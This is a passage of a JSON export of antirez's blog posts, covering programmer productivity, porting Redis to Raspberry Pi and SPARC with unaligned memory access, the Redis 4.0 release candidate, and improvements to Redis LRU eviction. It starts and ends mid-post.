algorithm, to get more work done than graduated programmers that were in theory extremely competent but very poor in the practice of implementing solutions.  * Experience: pattern matching  By experience I mean the set of already explored solutions for a number of recurring tasks. An experienced programmer eventually knows how to deal with a variety of sub tasks. This avoids both a lot of design work, but especially, is an extremely powerful weapon against design errors, that are in turn among the biggest enemies of simplicity.  * Focus: actual time VS hypothetical time  The number of hours spent writing code is irrelevant without looking at the quality of the time. Lack of focus can be generated by internal and external factors. Internal factors are procrastination, lack of interest in the project at hand (you can\u2019t be good doing things you do not love), lack of exercise / well-being, poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often and so forth. It seems natural that trying to improve focus and to reduce interruptions is going to have a non marginal effect on the programming productivity. Sometimes in order to gain focus, extreme measures are needed. For instance I only read emails from time to time and do not reply to most of them.  * Design sacrifice: killing 5% to get 90%  Often complexity is generated when there is no willingness to recognized that a non fundamental goal of a project is accounting for a very large amount of design complexity, or is making another more important goal very hard to reach, because there is a design tension among a fundamental feature and a non fundamental one. It is very important for a designer to recognize all the parts of a design that are not easy wins, that is, there is no proportionality between the effort and the advantages. A project that is executed in order to maximize the output, is going to focus exactly on the aspects that matter and that can be implemented in a reasonable amount of time. For example when designing Disque, a message broker, at some point I realized that by providing just best-effort ordering for the messages, all the other aspects of the project could be substantially improved: availability, query language and clients interaction, simplicity and performances.  * Simplicity  This is an obvious point that means all and nothing. In order to understand what simplicity is, it is worth to check how complexity is often generated. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices, and the accumulation of errors in the design activity.  If you think at the design process, each time a wrong path is pursued, we get more and more far from the optimal solution. An initial design error, in the wrong hands, will not generate a re-design of the same system, but will lead to the design of another complex solution in order to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.  The way simplicity can be achieved is to reason in terms of small metal \u201cproof of concepts\u201d, so that a large amount of simple designs can be explored in the mind of the programmer, to start working from something that looks the most viable and direct solution. Later, experience and personal design abilities will allow to improve the design and find sensible solutions for the sub-designs that need to be resolved.  However each time a complex solution is needed, it\u2019s important to reason for a long time about how the complexity can be avoided, and only continue in that direction if no better possibility is found even considering completely different alternatives.  * Perfectionism, or how to kill your productivity and bias your designs  Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and as a personality trait. In both the instances, I see this as one of the biggest barriers for a programmer to deliver things fast. Perfectionism and fear of external judice insert a designing bias that will result in poor choices in order to refine a design only according to psychological or trivially measurable parameters, where things like robustness, simplicity, ability to deliver in time, are often never accounted for.   * Knowledge: some theory is going to help  When dealing with complex tasks, knowledge about data structures, fundamental limits of computation, non trivial algorithms that are very suitable to model certain tasks, are going to have an impact in the ability to find a suitable design. To be a super expert of everything is not required, but to be at least aware of a multitude of potential solutions for a problem certainly is. For instance applying design sacrifice (accept some error percentage) and being aware of probabilistic set cardinality estimators, can be combined together in order to avoid a complex, slow and memory inefficient solution in order to count unique items in a stream.  * Low level: understanding the machine  A number of issues in programs, even when using high level languages, arise from the misunderstanding of how the computer is going to perform a given task. This may even lead to the need of re-designing and re-implementing again from scratch a project because there is a fundamental problem in the tools or algorithms used. Good competence of C, the understanding of how CPUs work and clear ideas about how the kernel operates and how system calls are implemented, can save from bad late-stage surprises.  * Debugging skills  It is very easy to spend an enormous amount of work in order to find bugs. The sum of being good at gaining state about a bug, incrementally, in order to fix it with a rational set of steps, and the attitude of writing simple code that is unlikely to contain too many bugs, can have a great effect on the programmer efficiency.  It is no surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined they allow for good implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call \u201copportunistic programming\u201d. Basically at every development step, the set of features to implement is chosen in order to have the maximum impact on the user base of the program, with the minimum requirement of efforts. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2017-02-28T11:08:42Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7872.5703411, "slug": "the-mythical-10x-programmer-28", "topics": []}}, {"model": "app.post", "pk": 29, "fields": {"title": "Redis on the Raspberry Pi: adventures in unaligned lands", "link": "http://antirez.com/news/111", "source": 1, "normalized_link": "antirez.com/news/111", "summary": "After 10 million of units sold, and practically an endless set of different applications and auxiliary devices, like sensors and displays, I think it\u2019s deserved to say that the Raspberry Pi is not just a success, it also became one of the preferred platforms for programmers to experiment in the embedded space. Probably with things like the Pi zero, it is also becoming the platform in order to create hardware products, without incurring all the risks and costs of designing, building, and writing software for vertical devices.  Well, I love to think that also Redis is a platform that programmers like to use when to hack, experiment, build new things. Moreover devices that can be used for embedded / IoT applications, often have the problem of temporarily or permanently storing data, for example received by sensors, on the device, to perform on-device computations or to send them to remote servers. Redis is adding a \u201cStream\u201d data type that is specifically suited for streams of data and time series storage, at this point the specification is near complete and work to implement it will start in the next weeks. Redis existing data structures, and the new streams, together with the small memory footprint, the decent performances it can provide even while running on small hardware (and resulting low energy usage), looked like a good match for Raspberry Pi potential applications, and in general for small ARM devices. The missing piece was the obvious one: to run well on the Pi.  One of the many cool things about the Pi is that its development environment does not look like the embedded development environments of a few years ago\u2026 It just runs Linux, with all the Debian-alike tooling you expect to find. Basically adapting Redis to work on the Pi was not a huge task. The most fundamental mismatch a Linux system program and the Pi could have, is a performance / footprint mismatch, but this a non issue because of the Redis design itself: an empty instance consumes a total of 1MB of Resident Set Size, serves queries from memory, so it is fast enough and does not stress the flash disk too much, and when persistence is needed, it uses AOF which has an append-only write pattern. However the Pi runs an ARM processor, and this requires some care when dealing with unaligned accesses.  In this blog post, while showing you what I did to make Redis and Raspberry Pi more happy together, I\u2019ll try to provide an overview about dealing with architectures that do not handle unaligned accesses transparently as the x86 platform does.  A few things about ARM processors \u2014  The most interesting thing about porting Redis to ARM is that ARM processors are, or actually were\u2026 well, not big fans of unaligned memory accesses. If you live your life in high level programming, you may not know it, but many processor architectures were historically not able to load or store memory words in addresses not multiple of the word size. So if the word size is 4 bytes (in the case of a 32 bit processor), you may load or store a word at address 0x4, 0x8, and so forth, but not at address 0x7. The result is an exception sometimes, or an odd behavior some other time, depending on the CPU and its exact configuration.  Then the x86 processors family ruled the world and everybody kinda forgot about this issue (if not for dealing with SEE instructions and alike, but now even those instructions have unaligned variants). Oh well, initially forgetting about the issue is not really what happened. Even if x86 processors could deal with unaligned accesses without raising an exception, doing so was a non trivial performance penalty: partial reads/writes at word boundary required to do the double of the work. But then recent x86 processors have optimizations that make unaligned accesses as fast as aligned accesses most of the times, so basically nowadays for x86 this is really Not An Issue.  ARM was, up to ARM v5, one of that platforms where unaligned accesses caused strange results, and very unexpected ones, actually. From the ARM official documentation: \u201cif the address is not a multiple of four, the LDR instruction returns a rotated result rather than performing a true unaligned word load. Generally, this rotation is not what the programmer expects.\u201d Oh well *definitely* not what the programmer expects. However even the original Raspberry Pi had an ARM v6 processor. The v6, while incurring into performance penalty, is able to deal with word-sized unaligned accesses. However instructions that deal with multiple words will raise an exception, terminating the program with a signal bus, or asking for help by the kernel (as we\u2019ll see later in more details). This means that Redis would not crash like crap immediately when running on the Pi, because most of the unaligned accesses performed by Redis were actually word-sized. However, from time to time, the compiler generated code to speedup the computation using multiple load/store instructions, or the Redis code itself tried to load/store 64 bit values from unaligned accesses. This normally would result into a crash, in theory, however Linux helps a bit in this regard.  Instead of crashing, ask the kernel! \u2014  The Linux kernel, when running on an ARM processor, is able to help user processes to work as expected even when they execute operations on unaligned addresses that are normally not supported by the CPU. The way this is performed is by registering an handler inside the kernel for such exceptions: the kernel will check the operation that failed, and will simulate it in a function, so that the final result is like if the processor executed it, and then will resume the \u201coffending\u201d process that will continue to run.  If you are into low level programming, this Linux kernel file is worth checking: http://lxr.free-electrons.com/source/arch/arm/mm/alignment.c  The actual behavior of the kernel when an unaligned access exception is raised by the CPU, is controlled by the file /proc/cpu/alignment:  $ cat /proc/cpu/alignment User:\t\t0 System:\t\t12590 (ip6_datagram_recv_common_ctl+0xc8/0xd4 [ipv6]) Skipped:\t0 Half:\t\t0 Word:\t\t0 DWord:\t\t0 Multi:\t\t12590 User faults:\t2 (fixup)  As you can see there are separated counters for all the unaligned accesses that were corrected by the kernel, both in user space and in kernel space. In the above case 12590 accesses where corrected in kernel space. No user land process was corrected. Note that the \u201cUser faults\u201d line shows the kernel configuration about what to do when an user space process performs an unaligned access that the CPU cannot handle: it can fix the problem, send a SIGBUS, or log the even in the kernel logs. This is controlled by single bits of an integer that can be written into /proc/cpu/alignment, so for instance in order to log (other than fix) user space unaligned accesses one can use \u201cecho 3 > /proc/cpu/alignment\u201d (bit 1 enables logging, bit 2 enables fixing).  My feeling is that the Linux kernel enabled such a feature not much since the kernel developers were concerned with the poor user space programmers that were not able to deal with unaligned memory accesses, but because the kernel itself does not always performs unaligned accesses as you can see from the \u201cSystem\u201d counter. So this was the simplest way to fix the Linux port on ARM instead of checking every single place of the code.  Given that Linux handles this transparently, one could be tempted to say, oh well\u2026 maybe there is nothing to fix here, Redis will just work as expected as long as we set /proc/cpu/alignment to fix things transparently. Actually this is not the case for two reasons:  1. When an unaligned access is performed and fixed by the kernel, this results in *very* slow execution. The speed penalty is much larger than, for example, the second memory access needed when doing unaligned work-sized accesses. While this only happens with multiple loads and stores instructions, it is still a shame that in certain conditions Redis would be much slower than needed.  2. The Linux kernel implementation of ARM misaligned accesses is not perfect. There is code that GCC will emit that contains instructions that are not handled well by Linux 4.4.34.  A trivial example is this one:  $ #include   int main(int argc, char **argv) {         int count = 1000;         char *buf = malloc(count*sizeof(double));         double sum = 0;         double *l = (double*) (buf+1);         while(count--) {                 l++;                 sum += *l;         }         return 0; }  $ gcc foo.c -g -ggdb $ ./a.out Bus error  Even if the kernel configuration in my Pi is set to deal with unaligned accesses and fix them, still the program received a SIGBUS! Let\u2019s see where this happens with GDB:  $ gdb ./a.out (gdb) run  Program received signal SIGBUS, Bus error. 0x00010484 in main (argc=1, argv=0xbefff3b4) at foo.c:10 10\t                sum += *l;  Well it\u2019s in the inner loop when our non aligned double pointer is deferenced, as expected. But we may want to check further what\u2019s happening, checking the ARM instruction that generated the exception:  (gdb) x/i $pc => 0x10484 :\tvldr\td6, [r11, #-20]\t; 0xffffffec  The VLDR instruction is used in order to load an extension register from a memory location, and is used for floating point math. For some reason the Linux kernel implementation of unaligned accesses correction, is not able to handle this instruction (I guess the implementation is just not complete as it should). The \u201cdmesg\u201d command will indeed show that the instruction was not recognized by the function that fixes the unaligned accesses:  [317778.925569] Alignment trap: not handling instruction ed937b00 at [<00010480>] [317778.925610] Unhandled fault: alignment exception (0x011) at 0x01cb8011  So, if the default C compiler in the Pi could emit code that the default Linux kernel could not handle, I really wanted Redis to be able to run without issues even when the kernel is configured for not fixing the unaligned accesses. This means that Redis on ARM should only perform word-sized unaligned accesses, the only ones that the CPU can handle transparently.  Fixing the bugs \u2014  Given that ARM deals well with most unaligned memory accesses, Redis appeared to be already working on the Pi, mostly. Especially since by default the kernel is configured to fix many of the unaligned accesses that are not supported. Even with the alignment fixing disabled, it still superficially worked. However running the tests revealed different crashes, especially in obvious areas like bit operations and hash functions.  The first thing now Redis does is to define USE_ALIGNED_ACCESS when compiled into architectures that don\u2019t support unaligned accesses. Then it was just a matter of fixing the code in order to avoid the fast paths where unaligned accesses where performed, or replacing the pointers deferencing with memcpy() operations. You may think that using memcpy() is ways slower than deferencing a pointer, but things are much better than that: for a fixed size mecpy call like memcpy(src,dst,sizeof(uint64_t)) the compiler is smart enough to avoid calling the function. It will actually generate the fastest set of instructions that will do the trick even if the address is not aligned. For instance, in x86 processors, this function call will actually be translated into a single MOV instruction.  After those fixes Redis and my two Raspberries, one original model B, and a much faster Pi 3, started to be great friends: all tests passing, but one about generating call traces in crash reports (but I\u2019m going to fix this one as well), and from time to time a few failures in the integration tests due to the slowness of the Pi to setup masters and slaves setups. However at this point my appetite for correctness was stimulated, I wanted some more alignment problems.  Let\u2019s go the extra mile: SPARC \u2014  While I was working at fixing Redis for ARM, there was a parallel issue open in the Github repository about making Redis run well on Solaris/SPARC. Now SPARC is not as gentle as ARM, it is not able to deal with *any* unaligned access. I remembered this very well as during my first years of C programming I bought a very old SPARC station 4: big endian and not able to deal with unaligned accesses of any kind at the same time, it gave me some perspective on porting programs around. It\u2019s a shame that after a few months of having it I spilled vodka on it, frying the motherboard forever, but I still have it in my parent\u2019s house.  Solaris/SPARC deals with unaligned accesses are more complex than Linux/ARM: 32 bit unaligned accesses are always fixed by the kernel, while 64 bit unaligned accesses are handled by registering an user space trap, according to the compilation flags. The Sun Studio C compiler has specific options to control what happens in a very precise way, and even tools in order to easily detect and fix such unaligned accesses.  If non-word sized unaligned accesses were rare in Redis, you could expect word-sized unaligned accesses to be everywhere. But actually it was not the case, since up to Redis 3.0 I used to test and fix Redis with an OpenBSD/SPARC box from time to time. So the biggest problem was the function to hash keys. The original Redis string library, called SDS, had a fixed sized header, so accesses were always aligned while hashing keys. Starting with Redis 3.2 the SDS header is variable in size, so this is no longer the case. Moreover there were other new unaligned accesses here and there accumulated since the last time I tested Redis on SPARC a few years ago.  To fix the hash function I also switched to SipHash, so this is also a security fix for HashDoS attacks. However it\u2019s worth to note that I\u2019m currently using a SipHash variant with reduced number of C and D rounds: SipHash1-2. This was made in order to avoid an otherwise non trivial speed regression, however there should not be practical attacks against SipHash1-2 AFAIK, and anyway is for sure more secure than what we previously used, Murmurhash2, that is so weak in that regard that\u2019s possible to generate seed-independent collisions.  The SipHash implementation I\u2019m using is the reference one, modified a bit in order to simplify the code and to have a case insensitive variant. It is designed in order to deal with unaligned accesses, and to be endian agnostic. The first time I see a well written reference implementation of an hash function perhaps\u2026  The other SPARC fixes were greatly simplified by a kind Redis user that provided me with a Solaris/SPARC access. In the process of fixing the unaligned accesses I also tried to fix building and testing Redis in Solaris/SPARC, so this was a good portability improvement exercise in general. After this task was completed, Redis is finally \u201calignment safe\u201d at least for the stand alone code. There is more work to do in the Cluster area.  Performances of Redis in the Raspberry Pi \u2014  Ok, back to the Pi :-) How fast is Redis running on such small hardware? Well, as there are more than one Pi model out there, there are multiple answers for this question. Redis on the Pi 3 is surprisingly fast. My benchmarks are performed via the loopback interface because Redis on the Pi will be mostly intended for local programs to write data to it, or to use it as a message bus for both IPC and for cloud-edge exchange of information (for cloud here I mean the central servers of an appliance, and for edge the local installation of an appliance). However it also runs well when accessed via the ethernet port.  On the Pi3, I get this numbers:  Test 1 : 5 millions writes with 1 million keys (even distribution among keys).  No persistence, no pipelining. 28000 ops/sec. Test 2: Like test 1 but with pipelining using groups of 8 operations: 80000 ops/sec. Test 3: Like test 1 but with AOF enabled, fsync 1 sec: 23000 ops/sec Test 4: Like test 3, but with an AOF rewrite in progress: 21000 ops/sec  Basically Redis on the Pi 3 looks fast enough for any use case. Consider that Redis is mostly single threaded, or double-threaded when it rewrites the AOF log, since there is another background process, so you can expect the above performances while, at the same time, other processes are running on the Pi. Bottom line is: the numbers does not mean we are saturating the Pi.  With the original model B things are *quite* different, those numbers are much lower, like 2000 ops/sec non pipelined, and 15000 ops/sec when pipelining is used. This huge gap looks to hint at very inefficient handling of syscalls like write and read that require a context switch. However they are still good enough numbers for most applications, since Redis is not going to serve external clients most of the times, and because when there is high-load data logging needed to be performed, pipelining is often simple to implement.  However right now I don\u2019t have one of the most interesting (other than the Pi 3) devices to test, which is the Pi zero. It will be interesting to see the numbers that it can deliver. They should be better than the Model B I\u2019m using.  Pi continuity \u2014  One thing I love about Redis running well on the Pi is that I\u2019m excited about Raspberry to become, with things like the Pi zero, potentially the to-go platform for IoT products. I mean even finished products intended for the final user. I can\u2019t stop thinking what I would like to do in the hardware space if I had time: sensors, displays, the GPIO port, and the very low price make it possible to build an hardware startup in a much simpler way compared to the past, and I love the idea that hackers around the world could now ship smart appliances of different kinds. I want to be somewhat part of this, even if marginally, providing a good Redis experience in the Pi (and in the future with Android and other ARM based systems). Redis has a good combination of low resource needs, append-only operations and data model suitable for both logging and in-device analysis of the data, in order to take actions based on historical events, so I really believe it can help in this space.  So starting from now the Raspberry Pi is for me one of the main target platforms for Redis, like the Linux servers originally were set as the Redis \u201cstandard\u201d. In the next weeks I\u2019ll continue with the fixes, that will all go into Redis 4.0. At the same time I\u2019ll write a new section in the Redis official site with all the informations about Redis and the Pi: benchmarks in the different devices, good practices, and so forth. Maybe in the future I\u2019ll be also able to release proof of concept \u201cagents\u201d in order to use Redis as a data bus between the IoT devices and the cloud, allowing the device to just log data inside Redis, with the agent taking care of moving the data on the cloud when the link with the outside world works, and at the same time fetching commands for the device to execute and sending back replies. This will be even more interesting when the stream data structure will be available in Redis 4.2.  I would love hearing about applications where you see Redis going to help in embedded setups, and what I could do in order to make it better in this regard. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2017-02-24T09:52:30Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7864.7887411, "slug": "redis-on-the-raspberry-pi-adventures-in-unaligned-lands-29", "topics": []}}, {"model": "app.post", "pk": 30, "fields": {"title": "The first release candidate of Redis 4.0 is out", "link": "http://antirez.com/news/110", "source": 1, "normalized_link": "antirez.com/news/110", "summary": "It\u2019s not yet stable but it\u2019s soon to become, and comes with a long list of things that will make Redis more useful for we users: finally Redis 4.0 Release Candidate 1 is here, and is bold enough to call itself 4.0 instead of 3.4. For me semantic versioning is not a thing, what I like instead is try to communicate, using version numbers and jumps, what\u2019s up with the new version, and in this specific case 4.0 means \u201cthis is the shit\u201d.  It\u2019s just that Redis 4.0 has a lot of things that Redis should have had since ages, in a different world where one developer can, like Ken The Warrior, duplicate itself in ten copies and start to code. But it does not matter how hard I try to learn about new vim shortcuts, still the duplicate-me thing is not in my chords.  But well, finally with 4.0 we got a lot of these stuff done\u2026 and here is the list of the big ones, with a few details and pointers to learn more.  1. Modules  As you probably already know Redis 4.0 got a modules system, and one that allows to do pretty fancy stuff like implementing new data types that are RDB/AOF persisted, create non blocking commands and so forth. The deal here is that all this is done with an higher level abstract API completely separated from the core, so the modules you write are going to work with new releases of Redis. Using modules I wrote Neural Redis, a neural network data type that can be trained inside Redis itself, and many people are doing very interesting stuff: there are new rate limiting commands (implemented in Rust!), Graph DBs on top of Redis, secondary indexes, time series modules, full text indexing, and a number of other stuff, and my feeling is that\u2019s just the start.  This does not just allow Redis to grow and cover new things, while taking the core, if not minimal, just with things that are useful to most users at least, pretty generic things that many people need. But also has the potential to avoid for many tasks the problem of rewriting a networked server, even if the goal is to create something not related to Redis, databases, caching, or whatever Redis is. That is, you can just write a module to use the Redis \u201cinfrastructure\u201d: the protocol, the clients people already wrote and so forth. So I\u2019ve a good feeling about it, no pressure for the core, freedom for the users that want to do more crazy stuff.  2. Replication version 2  So, that\u2019s going to be very useful in production from the POV of operations. At some point in the past we introduced what is known as \u201cPSYNC\u201d. It was a new master-slave protocol that allowed the master and the salve to continue from where they were, if the connection between the two broke. Before that, every single connection break in the replication link between master and slave would result into a full synchronization: generate an RDB file in the master, transfer it, load it in the slave, ok you know how this works. So PSYNC was like a real improvement. But not enough\u2026  PSYNC was not good enough when there was a failover. If a slave is promoted to master, the slaves that replicated with the old master were not able to connect to the new promoted slave and PSYNC with it: a full resynchronization was needed. This is not great, and is not good for Redis Cluster as well. However fixing this required to do changes to the replication protocol, because I really wanted to make sure that partial resyncs where going to work after any possible topology change, as long as there was a common replication history among the instances.  So the first change needed was about how \u201cchained replication\u201d works, that is, slaves of slaves of slaves \u2026 How do they work? Like, A is the master, and we have something like that:  \tA \u2014> B \u2014> C \u2014> D  So A is the master of B but B is the master of C and so forth. Before Redis 4.0 what was happening is that B received the replication protocol from A. The replication protocol is, normally, a stream of write commands. B acted as a master for C just doing, internally, what A was doing: at every write it was generating again a suitable replication protocol to pass to C, and so forth.  Now instead B just proxies, verbatim, what it receives from A to C, and C will do the same for D: given that all the sub slaves now receive an identical stream of bytes, they can \u201ctag\u201d a given history, and use the tag and the offset to always try to continue if they have something in common.  The master itself, when it is turned into a slave, is now able to PSYNC with the new master. And slaves can usually PSYNC with the master even after a \u201cclean\u201d restart, using the info inside the RDB file, that now stores the replication tags and offsets.  Details are more complex than that, in order to make it working well, but well the deal here is, don\u2019t be annoyed by full resynchronizations if possible. And PSYNC v2 does this well apparently. Please try it and let me know if you are interested in this feature.  3. Cache eviction improvements  Ok about that I wrote a full article months ago: http://antirez.com/news/109. So going to give you just the TLDR. We now have LFU (Last Frequently Used), and all the other policies switched to a more robust, fast and precise implementation. So big news for caching use cases. Read the full article if you care about this stuff, there are tons of infos.  4. Non blocking DEL and FLUSHALL/FLUSHDB.  Code name \u201clazy freeing of objects\u201d, but it\u2019s a lame name for a neat feature. There is a new command called UNLINK that just deletes a key reference in the database, and does the actual clean up of the allocations in a separated thread, so if you use UNLINK instead of DEL against a huge key the server will not block. And even better with the ASYNC options of FLUSHALL and FLUSHDB you can do that for whole DBs or for all the data inside the instance, if you want. Combined with the new SWAPDB command, that swaps two Redis databases content, FLUSHDB ASYNC can be quite interesting. Once you, for instance, populated DB 1 with the new version of the data, you can SWAPDB 0 1 and FLUSHDB ASYNC the database with the old data, and create yet a newer version and reiterate. This is only possible now because flushing a whole DB is no longer blocking.  There are reasons why UNLINK is not the default for DEL. I know things\u2026 I can\u2019t talk (**).  5. Mixed RDB-AOF persistence format.  Optionally, if you enable it, now AOF rewrites are performed by prefixing the AOF file with an RDB file, which is both faster to generate and to load. This is going to be very useful in certain environments, but makes the AOF file a less transparent file, so it\u2019s an optional thing for now. This feature was talked for ages and finally is \u201cin\u201d.  6. The new MEMORY command.  I love it, as much as I loved LATENCY DOCTOR that once introduced cut the percentage of \u201cMy Redis is slow\u201d complains in the mailing list to a minor fraction. Now we have it for the memory issues as well.  127.0.0.1:6379> MEMORY DOCTOR Hi Sam, this instance is empty or is using very little memory, my issues detector can't be used in these conditions. Please, leave for your mission on Earth and fill it with some data. The new Sam and I will be back to our programming as soon as I finished rebooting.  Movie rights owners will probably sue me for taking inspirations of sci-fi dialogues but that\u2019s fine. Bring oranges for me when I\u2019ll be in jail.  MEMORY does a lot more than that.  127.0.0.1:6379> MEMORY HELP 1) \"MEMORY USAGE  [SAMPLES ] - Estimate memory usage of key\" 2) \"MEMORY STATS                         - Show memory usage details\" 3) \"MEMORY PURGE                         - Ask the allocator to release memory\" 4) \"MEMORY MALLOC-STATS                  - Show allocator internal stats\"  The memory usage reporting of the USAGE subcommand is going to be very useful, but also the in depth informations provided by \u201cSTATS\u201d.  For now all this is totally not documented, so have fun figuring out what the heck it does.  7. Redis Cluster is now NAT / Docker compatible.  But this is actually a bad news too, because the binary protocol changed in the \u201cCluster bus\u201d thing nodes use to communicate, so to upgrade to 4.0 you need a mass reboot of Redis Cluster. I\u2019m sorry I was tricked into this NAT / Docker fixes, pardon me. And I tried to make it backward compatible but there was no way to obtain this easily, or even non easily, without doing totally awkward stuff.  The feature is explained in the example redis.conf file. You can\u2019t see how I\u2019m a bit less excited about this feature compared to the other ones, don\u2019t you?  Well\u2026 that\u2019s it I guess, those are the major things. If you want also read the release notes here: https://raw.githubusercontent.com/antirez/redis/4.0/00-RELEASENOTES  ETA to get it stable is as usually unknown: I plan to release a new RC every 2-4 weeks more or less. As bugs slow down significantly both from the point of view of severity and frequency of reporting, it will be Redis 4.0-final time. However there is a lot of doc to update as well, so I\u2019ll have plenty of things to do.  Many thanks to all the people that contributed to this release: a lot did in significant ways. In the release note above there is the list of all the commits that you can scan in order to see the names of the committers.  Thanks to the Redis community and Redis Labs for making all this possible, but especially thanks to all the developers that use Redis and apply it well in every day problems to get shit done, because this is the whole point, other than having fun while coding.  P.s. faster way to grab the new code is to fetch the '4.0' branch from Github. Repository is as usually antirez/redis.  ** Check https://news.ycombinator.com/item?id=13091370 for more info about UNLINK not being the default behavior for DEL. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-12-02T17:25:58Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7704.1133633, "slug": "the-first-release-candidate-of-redis-40-is-out-30", "topics": []}}, {"model": "app.post", "pk": 31, "fields": {"title": "Random notes on improving the Redis LRU algorithm", "link": "http://antirez.com/news/109", "source": 1, "normalized_link": "antirez.com/news/109", "summary": "Redis is often used for caching, in a setup where a fixed maximum memory to use is specified. When new data arrives, we need to make space by removing old data. The efficiency of Redis as a cache is related to how good decisions it makes about what data to evict: deleting data that is going to be needed soon is a poor strategy, while deleting data that is unlikely to be requested again is a good one.  In other terms every cache has an hits/misses ratio, which is, in qualitative terms, just the percentage of read queries that the cache is able to serve. Accesses to the keys of a cache are not distributed evenly among the data set in most workloads. Often a small percentage of keys get a very large percentage of all the accesses. Moreover the access pattern often changes over time, which means that as time passes certain keys that were very requested may no longer be accessed often, and conversely, keys that once were not popular may turn into the most accessed keys.  So in general what a cache should try to do is to retain the keys that have the highest probability of being accessed in the future. From the point of view of an eviction policy (the policy used to make space to allow new data to enter) this translates into the contrary: the key with the least probability of being accessed in the future should be removed from the data set. There is only one problem: Redis and other caches are not able to predict the future.  The LRU algorithm ===  While caches can\u2019t predict the future, they can reason in the following way: keys that are likely to be requested again are keys that were recently requested often. Since usually access patterns don\u2019t change very suddenly, this is an effective strategy. However the notion of \u201crecently requested often\u201d is more insidious that it may look at a first glance (we\u2019ll return shortly on this). So this concept is simplified into an algorithm that is called LRU, which instead just tracks the *last time* a key was requested. Keys that are accessed with an higher frequency have a greater probability of being idle (not accessed) for a shorter time compared to keys that are rarely accessed.  For instance this is a representation of four different keys accesses over time. Each \u201c~\u201d character is one second, while the \u201c|\u201d line at the end is the current instant.  ~~~~~A~~~~~A~~~~~A~~~~A~~~~~A~~~~~A~~| ~~B~~B~~B~~B~~B~~B~~B~~B~~B~~B~~B~~B~| ~~~~~~~~~~C~~~~~~~~~C~~~~~~~~~C~~~~~~| ~~~~~D~~~~~~~~~~D~~~~~~~~~D~~~~~~~~~D|  Key A is accessed one time every 5 seconds, key B once every 2 seconds and key C and D are both accessed every 10 seconds.  Given the high frequency of accesses of key B, it has among the lowest idle times, which means its last access time is the second most recent among all the four keys.  Similarly A and C idle time of 2 and 6 seconds well reflect the access frequency of both those keys. However as you can see this trick does not always work: key D is accessed every 10 seconds, however it has the most recent access time of all the keys.  Still, in the long run, this algorithm works well enough. Usually keys with a greater access frequency have a smaller idle time. The LRU algorithm evicts the Least Recently Used key, which means the one with the greatest idle time. It is simple to implement because all we need to do is to track the last time a given key was accessed, or sometimes this is not even needed: we may just have all the objects we want to evict linked in a linked list. When an object is accessed we move it to the top of the list. When we want to evict objects, we evict from the tail of the list. Tada! Win.  LRU in Redis: the genesis ===  Initially Redis had no support for LRU eviction. It was added later, when memory efficiency was a big concern. By modifying a bit the Redis Object structure I was able to make 24 bits of space. There was no room for linking the objects in a linked list (fat pointers!), moreover the implementation needed to be efficient, since the server performance should not drop too much because of the selection of the key to evict.  The 24 bits in the object are enough to store the least significant bits of the current unix time in seconds. This representation, called \u201cLRU clock\u201d inside the source code of Redis, takes 194 days to overflow. Keys metadata are updated much often, so this was good enough.  However there was another more complex problem to solve, how to select the key with the greatest idle time in order to evict it? The Redis key space is represented via a flat hash table. To add another data structure to take this metadata was not an option, however since LRU is itself an approximation of what we want to achieve, what about approximating LRU itself?  The initial Redis algorithm was as simple as that: when there is to evict a key, select 3 random keys, and evict the one with the highest idle time. Basically we do random sampling over the key space and evict the key that happens to be the better. Later this \u201c3 random keys\u201d was turned into a configurable \u201cN random keys\u201d and the algorithm speed was improved so that the default was raised to 5 keys sampling without losing performances. Considering how naive it was, it worked well, very well actually. If you think at it, you always never do the best decision with this algorithm, but is very unlikely to do a very bad decision too. If there is a subset of very frequently accessed keys in the data set, out of 5 keys it is hard to be so unlucky to only sample keys with a very short idle time.  However if you think at this algorithm *across* its executions, you can see how we are trashing a lot of interesting data. Maybe when sampling the N keys, we encounter a lot of good candidates, but we then just evict the best, and start from scratch again the next cycle.  First rule of Fight Club is: observe your algorithms with naked eyes ===  At some point I was in the middle of working at the upcoming Redis 3.0 release. Redis 2.8 was actively used as an LRU cache in multiple environments, and people didn\u2019t complained too much about the precision of the eviction in Redis, but it was clear that it could be improved even without using a noticeable amount of additional CPU time, and not a single bit of additional space.  However in order to improve something, you have to look at it. There are different ways to look at LRU algorithms. You can write, for example, tools that simulate different workloads, and check the hit/miss ratio at the end. This is what I did, however the hit/miss ratio depends a lot on the access pattern, so additionally to this information I wrote an utility that actually displayed the algorithm quality in a visual way.  The program was very simple: it added a given number of keys, then accessed the keys sequentially so that each had a decreasing idle time. Finally 50% more keys were added (the green ones in the picture), so that half of the old keys needed to be evicted.  In a perfect LRU implementation no key from the new added keys are evicted, and the initial 50% of the old dataset is evicted.  This is the representation produced by the program for different versions of Redis and different settings:  http://redis.io/images/redisdoc/lru_comparison.png  When looking at the graph remember that the implementation we discussed so far is the one of Redis 2.8. The improvement you see in Redis 3.0 is explained in the next section.  LRU V2: don\u2019t trash away important information ===  With the new visual tool, I was able to try new approaches and test them in a matter of minutes. The most obvious way to improve the vanilla algorithm used by Redis was to accumulate the otherwise trashed information in a \u201cpool\u201d of good candidates for eviction.  Basically when the N keys sampling was performed, it was used to populate a larger pool of keys (just 16 keys by default). This pool has the keys sorted by idle time, so new keys only enter the pool when they have an idle time greater than one key in the pool or when there is empty space in the pool.  This small change improved the performances of the algorithm dramatically as you can see in the image I linked above and the implementation was not so complex. A couple memmove() here and there and a few profiling efforts, but I don\u2019t remember major bugs in this area.  At the same time, a new redis-cli mode to test the LRU precision was added (see the \u2014lru-test option), so I had another way to check the performances of the LRU code with a power-law access pattern. This tool was used to validate with a different test that the new algorithm worked better with a more real-world-ish workload. It also uses pipelining and displays the accesses per second, so can be used in order to benchmark different 